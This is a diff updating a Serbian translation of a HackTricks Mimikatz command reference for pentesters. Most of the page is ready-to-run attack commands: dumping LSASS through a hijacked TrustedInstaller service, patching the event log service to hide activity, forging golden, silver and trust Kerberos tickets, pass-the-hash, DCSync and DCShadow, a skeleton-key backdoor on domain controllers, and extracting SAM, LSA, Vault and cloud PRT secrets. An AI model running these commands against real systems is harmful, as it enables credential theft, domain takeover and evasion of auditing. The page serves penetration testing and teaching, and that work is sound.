@@ -3,82 +3,82 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-**Ova stranica je zasnovana na jednoj sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Pogledaj original za više informacija!
+**Ova stranica je zasnovana na stranici sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Pogledajte original za dodatne informacije!<sup>[[3]](#references)</sup>
 
-## LM and Clear-Text in memory
+## LM i Clear-Text u memoriji
 
-Od Windows 8.1 i Windows Server 2012 R2 nadalje, sprovedene su značajne mere za zaštitu od krađe credentiala:
+Od Windows 8.1 i Windows Server 2012 R2, uvedene su značajne mere za zaštitu od krađe credentials:
 
-- **LM hashes i plain-text passwords** se više ne čuvaju u memoriji radi povećanja bezbednosti. Određeno registry podešavanje, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti podešeno na DWORD vrednost `0` da bi se onemogućio Digest Authentication, čime se obezbeđuje da se "clear-text" passwords ne keširaju u LSASS.
+- **LM hashes i plain-text passwords** se više ne čuvaju u memoriji radi poboljšanja bezbednosti. Određena registry postavka, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` kako bi se onemogućila Digest Authentication, čime se osigurava da se "clear-text" passwords ne keširaju u LSASS-u.
 
-- **LSA Protection** je uveden da zaštiti Local Security Authority (LSA) proces od neovlašćenog čitanja memorije i code injection. Ovo se postiže označavanjem LSASS-a kao protected process. Aktivacija LSA Protection uključuje:
-1. Izmenu registry-ja na _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ podešavanjem `RunAsPPL` na `dword:00000001`.
-2. Implementaciju Group Policy Object (GPO) koja primenjuje ovu registry promenu na svim upravljanim uređajima.
+- **LSA Protection** je uveden radi zaštite procesa Local Security Authority (LSA) od neovlašćenog čitanja memorije i code injection-a. To se postiže označavanjem LSASS-a kao protected process. Aktiviranje LSA Protection-a obuhvata:
+1. Izmenu registry-ja na _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem vrednosti `RunAsPPL` na `dword:00000001`.
+2. Implementaciju Group Policy Object-a (GPO) koji nameće ovu promenu registry-ja na svim upravljanim uređajima.
 
-Uprkos ovim zaštitama, alati poput Mimikatz mogu zaobići LSA Protection koristeći specifične drivere, iako će takve aktivnosti verovatno biti zabeležene u event logs.
+Uprkos ovim zaštitama, alati poput Mimikatz-a mogu zaobići LSA Protection korišćenjem specifičnih driver-a, iako će takve radnje verovatno biti zabeležene u event logovima.
 
-Na modernim workstationima ovo je još važnije zato što je **Credential Guard omogućen podrazumevano na mnogim Windows 11 22H2+ i Windows Server 2025 domain-joined, non-DC sistemima**, dok je **LSASS-as-PPL omogućen podrazumevano na svežim Windows 11 22H2+ instalacijama**. U praksi, to znači da `sekurlsa::logonpasswords` često daje manje materijala nego što je stariji tradecraft očekivao, pa operatori sve više prelaze na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, ili **CloudAP/PRT-oriented modules**. Za stranu zaštite, pogledaj [Windows credentials protections](credentials-protections.md).
+Na modernim workstation-ima ovo je još važnije jer je **Credential Guard podrazumevano omogućen na mnogim Windows 11 22H2+ i Windows Server 2025 sistemima pridruženim domenu, koji nisu DC sistemi**, dok je **LSASS-as-PPL podrazumevano omogućen na novim Windows 11 22H2+ instalacijama**. U praksi to znači da `sekurlsa::logonpasswords` često daje manje materijala nego što se očekivalo na osnovu starijih tradecraft tehnika, pa operatori sve češće prelaze na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** ili module usmerene na **CloudAP/PRT**. Za informacije o zaštiti pogledajte [Windows credentials protections](credentials-protections.md).
 
-### Counteracting SeDebugPrivilege Removal
+### Suprotstavljanje uklanjanju SeDebugPrivilege-a
 
-Administratori obično imaju SeDebugPrivilege, što omogućava debugovanje programa. Ovo privilegijum može biti ograničeno da bi se sprečilo neovlašćeno memory dumps, uobičajena tehnika koju napadači koriste za izdvajanje credentiala iz memorije. Međutim, čak i kada je ovaj privilegijum uklonjen, TrustedInstaller nalog i dalje može da izvrši memory dumps koristeći prilagođenu service configuration:
+Administratori obično imaju SeDebugPrivilege, koji im omogućava debug-ovanje programa. Ova privilegija može biti ograničena kako bi se sprečili neovlašćeni memory dumps, što je uobičajena tehnika koju napadači koriste za izvlačenje credentials iz memorije. Međutim, čak i kada je ova privilegija uklonjena, TrustedInstaller account i dalje može da izvršava memory dumps korišćenjem prilagođene service konfiguracije:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Ovo omogućava izbacivanje memorije `lsass.exe` u fajl, koji se zatim može analizirati na drugom sistemu radi izdvajanja kredencijala:
+Ovo omogućava dumpovanje memorije procesa `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu radi izvlačenja akreditiva:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-## Mimikatz Options
+## Mimikatz opcije
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+Manipulacija event logovima u Mimikatz-u obuhvata dve primarne radnje: brisanje event logova i patch-ovanje Event servisa kako bi se sprečilo logovanje novih eventova. U nastavku su navedene komande za izvršavanje ovih radnji:
 
-#### Clearing Event Logs
+#### Brisanje event logova
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+- **Komanda**: Ova radnja ima za cilj brisanje event logova, čime se otežava praćenje malicioznih aktivnosti.
+- Mimikatz ne obezbeđuje direktnu komandu u svojoj standardnoj dokumentaciji za direktno brisanje event logova putem komandne linije. Međutim, manipulacija event logovima obično podrazumeva korišćenje sistemskih alata ili skripti izvan Mimikatz-a za brisanje određenih logova (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).
 
-#### Experimental Feature: Patching the Event Service
+#### Eksperimentalna funkcija: Patch-ovanje Event servisa
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- **Komanda**: `event::drop`
+- Ova eksperimentalna komanda je namenjena izmeni ponašanja Event Logging Service-a, čime se efektivno sprečava beleženje novih eventova.
+- Primer: `mimikatz "privilege::debug" "event::drop" exit`
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+- Komanda `privilege::debug` obezbeđuje da Mimikatz radi sa neophodnim privilegijama za izmenu sistemskih servisa.
+- Komanda `event::drop` zatim patch-uje Event Logging servis.
 
-### Kerberos Ticket Attacks
+### Kerberos Ticket napadi
 
-Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.
+Koristite komande u nastavku kao brzi podsetnik na sintaksu. Posebne stranice za [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) i [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) sadrže aktuelne AES/PAC/opsec nijanse.
 
-### Golden Ticket Creation
+### Kreiranje Golden Ticket-a
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+Golden Ticket omogućava impersonaciju sa pristupom na nivou celog domena. Ključna komanda i parametri:
 
-- Command: `kerberos::golden`
-- Parameters:
-- `/domain`: Ime domena.
+- Komanda: `kerberos::golden`
+- Parametri:
+- `/domain`: Naziv domena.
 - `/sid`: Security Identifier (SID) domena.
-- `/user`: Korisničko ime za impersonate.
-- `/krbtgt`: NTLM hash naloga domena za KDC service.
+- `/user`: Korisničko ime za impersonaciju.
+- `/krbtgt`: NTLM hash servisnog naloga KDC-a domena.
 - `/ptt`: Direktno ubacuje ticket u memoriju.
 - `/ticket`: Čuva ticket za kasniju upotrebu.
 
-Example:
+Primer:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Kreiranje Silver Ticket
+### Silver Ticket Creation
 
-Silver Ticket omogućavaju pristup specifičnim servisima. Ključna komanda i parametri:
+Silver Tickets omogućavaju pristup određenim servisima. Ključna komanda i parametri:
 
-- Komanda: Slično kao Golden Ticket, ali cilja specifične servise.
+- Komanda: Slično kao kod Golden Ticket-a, ali cilja određene servise.
 - Parametri:
-- `/service`: Servis koji se cilja (npr. cifs, http).
-- Ostali parametri slični kao kod Golden Ticket.
+- `/service`: Servis koji treba ciljati (npr. cifs, http).
+- Ostali parametri slični kao kod Golden Ticket-a.
 
 Primer:
 ```bash
@@ -86,12 +86,12 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Kreiranje Trust Ticket-a
 
-Trust Ticket-i se koriste za pristup resursima preko domena iskorišćavanjem trust relationships. Ključna komanda i parametri:
+Trust Tickets se koriste za pristup resursima širom domena korišćenjem trust odnosa. Ključna komanda i parametri:
 
-- Komanda: Slično kao Golden Ticket, ali za trust relationships.
+- Komanda: Slično kao Golden Ticket, ali za trust odnose.
 - Parametri:
 - `/target`: FQDN ciljnog domena.
-- `/rc4`: NTLM hash za trust account.
+- `/rc4`: NTLM hash za trust nalog.
 
 Primer:
 ```bash
@@ -101,60 +101,60 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **Listing Tickets**:
 
-- Komanda: `kerberos::list`
-- Prikazuje sve Kerberos tickete za trenutnu korisničku sesiju.
+- Command: `kerberos::list`
+- Izlistava sve Kerberos tikete za trenutnu sesiju korisnika.
 
 - **Pass the Cache**:
 
-- Komanda: `kerberos::ptc`
-- Ubacuje Kerberos tickete iz cache fajlova.
-- Primer: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- Command: `kerberos::ptc`
+- Ubacuje Kerberos tikete iz cache datoteka.
+- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Pass the Ticket**:
 
-- Komanda: `kerberos::ptt`
-- Omogućava korišćenje Kerberos ticketa u drugoj sesiji.
-- Primer: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- Command: `kerberos::ptt`
+- Omogućava korišćenje Kerberos tiketa u drugoj sesiji.
+- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
 - **Purge Tickets**:
-- Komanda: `kerberos::purge`
-- Briše sve Kerberos tickete iz sesije.
-- Korisno pre korišćenja komandi za manipulaciju ticketima da bi se izbegli konflikti.
+- Command: `kerberos::purge`
+- Uklanja sve Kerberos tikete iz sesije.
+- Korisno je pre korišćenja komandi za manipulaciju tiketima kako bi se izbegli konflikti.
 
 ### Over-Pass-the-Hash / Pass-the-Key
 
-Ako je `RC4` onemogućen ili nepouzdan, Mimikatz može da patchuje **AES128/AES256 Kerberos keys** u trenutnu logon sesiju umesto da koristi samo NT hash. Ovo je obično bolji izbor za moderne domene nego tretirati `sekurlsa::pth` kao NTLM-only.
+Ako je `RC4` onemogućen ili nepouzdan, Mimikatz može da ubaci **AES128/AES256 Kerberos ključeve** u trenutnu logon sesiju, umesto da koristi samo NT hash. Ovo obično bolje odgovara modernim domenima nego tretiranje `sekurlsa::pth` kao isključivo NTLM metode.<sup>[[1]](#references)</sup>
 ```bash
 mimikatz "privilege::debug" "sekurlsa::ekeys" exit
 mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
 mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
 ```
-`/impersonate` ponovo koristi trenutni proces umesto da pokrene novu konzolu, što je korisno kada želiš odmah da pokreneš stvari kao što je `lsadump::dcsync` u istom kontekstu.
+`/impersonate` ponovo koristi trenutni proces umesto pokretanja nove konzole, što je korisno kada želite da odmah pokrenete stvari kao što je `lsadump::dcsync` u istom kontekstu.
 
-### Active Directory Tampering
+### Menjanje Active Directory-ja
 
-- **DCShadow**: Privremeno natera mašinu da se ponaša kao DC za manipulaciju AD objekata. Pogledajte [DCShadow](../active-directory-methodology/dcshadow.md).
+- **DCShadow**: Privremeno pretvara mašinu u DC radi manipulacije AD objektima. Pogledajte [DCShadow](../active-directory-methodology/dcshadow.md).
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Oponaša DC da bi zatražio podatke o lozinkama. Pogledajte [DCSync](../active-directory-methodology/dcsync.md).
+- **DCSync**: Oponaša DC radi zahtevanja podataka o lozinkama. Pogledajte [DCSync](../active-directory-methodology/dcsync.md).
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Pristup credentialima
 
-- **LSADUMP::LSA**: Ekstrahuje kredencijale iz LSA.
+- **LSADUMP::LSA**: Izvlači credentials iz LSA.
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinki naloga računara.
+- **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinki computer naloga.
 
-- _Nije naveden konkretan komad za NetSync u originalnom kontekstu._
+- _U originalnom kontekstu nije navedena konkretna komanda za NetSync._
 
-- **LSADUMP::SAM**: Pristupa lokalnoj SAM bazi.
+- **LSADUMP::SAM**: Pristupa lokalnoj SAM bazi podataka.
 
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Dešifruje tajne sačuvane u registriju.
+- **LSADUMP::Secrets**: Dešifruje secrets sačuvane u registru.
 
 - `mimikatz "lsadump::secrets" exit`
 
@@ -162,70 +162,71 @@ mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Pribavlja informacije o autentifikaciji poverenja.
+- **LSADUMP::Trust**: Preuzima informacije o autentikaciji trust-a.
 - `mimikatz "lsadump::trust" exit`
 
 ### Cloud credentials / Entra ID
 
-Na hostovima sa **Entra ID** ili **hybrid-joined**, `sekurlsa::cloudap` može izložiti keširane materijale **Primary Refresh Token (PRT)** iz LSASS-a. Ako je povezani Proof-of-Possession ključ zaštićen softverom, `dpapi::cloudapkd` može izvesti clear/derived key materijal potreban za naknadne **Pass-the-PRT** tokove rada.
+Na hostovima sa **Entra ID** ili **hybrid-joined** statusom, `sekurlsa::cloudap` može da otkrije keširani materijal **Primary Refresh Token (PRT)** iz LSASS-a. Ako je pridruženi Proof-of-Possession ključ zaštićen softverom, `dpapi::cloudapkd` može da izvede jasan/izvedeni materijal ključa potreban za naknadne **Pass-the-PRT** workflow-e.<sup>[[1]](#references)</sup>
 ```bash
 mimikatz "privilege::debug" "sekurlsa::cloudap" exit
 mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
 mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
 ```
-Ovo postaje mnogo teže kada je ključ TPM-backed, ali vredi proveriti na hybrid endpoint-ovima jer cached CloudAP podaci mogu biti zanimljiviji od klasičnog `wdigest` output-a. Za cloud-side abuse chain, vidi [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
+Ovo postaje mnogo teže kada je ključ podržan TPM-om, ali vredi proveriti hybrid endpoints jer keširani CloudAP podaci mogu biti zanimljiviji od klasičnog `wdigest` output-a.<sup>[[2]](#references)</sup> Za cloud-side abuse chain pogledajte [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
 
-### Miscellaneous
+### Razno
 
-- **MISC::Skeleton**: Ubacuje backdoor u LSASS na DC.
+- **MISC::Skeleton**: Inject backdoor u LSASS na DC-u.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Eskalacija privilegija
 
-- **PRIVILEGE::Backup**: Dobija backup prava.
+- **PRIVILEGE::Backup**: Dobijanje backup prava.
 
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Dobija debug privilegije.
+- **PRIVILEGE::Debug**: Dobijanje debug privilegija.
 - `mimikatz "privilege::debug" exit`
 
 ### Credential Dumping
 
-- **SEKURLSA::LogonPasswords**: Prikazuje credentials za prijavljene korisnike.
+- **SEKURLSA::LogonPasswords**: Prikaz kredencijala za prijavljene korisnike.
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Ekstrahuje Kerberos tickets iz memorije.
+- **SEKURLSA::Tickets**: Extract Kerberos ticket-a iz memorije.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Manipulacija SID-om i tokenima
 
-- **SID::add/modify**: Menja SID i SIDHistory.
+- **SID::add/modify**: Promena SID-a i SIDHistory-ja.
 
 - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Modify: _Nema specifične komande za modify u originalnom kontekstu._
+- Modify: _U originalnom kontekstu nije navedena posebna komanda za modify._
 
-- **TOKEN::Elevate**: Impersonira tokene.
+- **TOKEN::Elevate**: Impersonate token-a.
 - `mimikatz "token::elevate /domainadmin" exit`
 
 ### Terminal Services
 
-- **TS::MultiRDP**: Dozvoljava više RDP sesija.
+- **TS::MultiRDP**: Omogućavanje više RDP sesija.
 
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: Prikazuje TS/RDP sesije.
-- _Nema specifične komande za TS::Sessions u originalnom kontekstu._
+- **TS::Sessions**: Izlistavanje TS/RDP sesija.
+- _U originalnom kontekstu nije navedena posebna komanda za TS::Sessions._
 
 ### Vault
 
-- Ekstrahuje passwords iz Windows Vault.
+- Extract password-a iz Windows Vault-a.
 - `mimikatz "vault::cred /patch" exit`
 
 
-## References
+## Reference
 
-- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
-- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
+- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
+- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
+- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)
 
 {{#include ../../banners/hacktricks-training.md}}
